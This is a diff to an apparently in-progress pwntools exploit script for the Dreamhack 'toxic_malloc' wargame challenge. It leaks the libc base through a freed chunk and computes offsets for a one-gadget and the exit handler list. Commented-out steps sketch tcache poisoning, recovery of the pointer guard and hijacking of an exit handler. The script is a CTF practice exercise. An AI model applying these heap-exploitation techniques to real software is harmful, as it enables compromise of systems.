@@ -1,10 +1,11 @@
 from pwn import *
 
 # context.log_level = 'debug'
-# context.terminal = ['tmux', 'new-window']
+context.terminal = ['tmux', 'new-window']
 
+ld = "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/ld-linux-x86-64.so.2"
 env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
-rem = process("./Pwnable/toxic_malloc/problem/deploy/chall", env=env)
+rem = process([ld, "./Pwnable/toxic_malloc/problem/deploy/chall"], env=env)
 # port = 18595
 # rem = remote("host3.dreamhack.games", port)
 
@@ -40,10 +41,10 @@ def update(idx, data):
   rem.sendlineafter(b': ', str(idx).encode())
   rem.sendafter(b': ', data)
 
-def read(idx):
+def read(idx, dummy = b"data: "):
   rem.sendlineafter(b'choice:', b"3")
   rem.sendlineafter(b": ", str(idx).encode())
-  rem.recvuntil(b"data: ")
+  rem.recvuntil(dummy)
   return rem.recvline()
 
 def delete(idx):
@@ -53,7 +54,6 @@ def delete(idx):
 def exit():
   rem.sendlineafter(b'choice:', b"5")
 
-gdb.attach(rem)
 
 create(0, b'A' * 8)
 create(1, b'A' * 8)
@@ -70,12 +70,36 @@ for i in range(1, 7):
   delete(0)
 
 lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
-exit_funcs = lib_base + 0x219838
-fs_base = lib_base - 0x28c0
-initial = lib_base + 0x21af00
-fake_exit_function_list = heap_base + 0x2a8
-dl_fini_addr = lib_base + 0x3ab040
+initial = lib_base + 0x21bf00
+dl_fini_addr = lib_base + 0x256040
+gadget_addr = lib_base + 0xebc81
+
 print(hex(lib_base))
+print(hex(initial))
+print(hex(gadget_addr))
+
+# update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
+# create(2, p64(safe_link(heap_base+0x2a0, initial)))
+# create(3, b"B" * 16)
+# payload = b"C" * 0x18
+# create(4, payload)
+
+# mangle_dl_fini = u64(read(4, payload).rstrip().ljust(8, b'\x00'))
+# pointer_gaurd = ror(mangle_dl_fini, 0x11, word_size=64) ^ dl_fini_addr
+# print(hex(pointer_gaurd))
+gdb.attach(rem)
+# print(p64(rol(gadget_addr, 0x11, word_size=64)))
+# update(4, p64(4) + p64(rol(gadget_addr, 0x11, word_size=64)))
+
+# delete(1)
+# update(1, p64(1) * 2)
+# delete(1)
+# update(1, p64(initial + 0x18))
+
+# create(3, b"A" * 8)
+
+
+# print(read(1))
 
 # update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
 # create(2, p64(safe_link(heap_base+0x2a0, fs_base+0x30)))
@@ -95,6 +119,6 @@ print(hex(lib_base))
 
 exit()
 
-print(rem.recvline())
+# print(rem.recvline())
 
 rem.interactive()
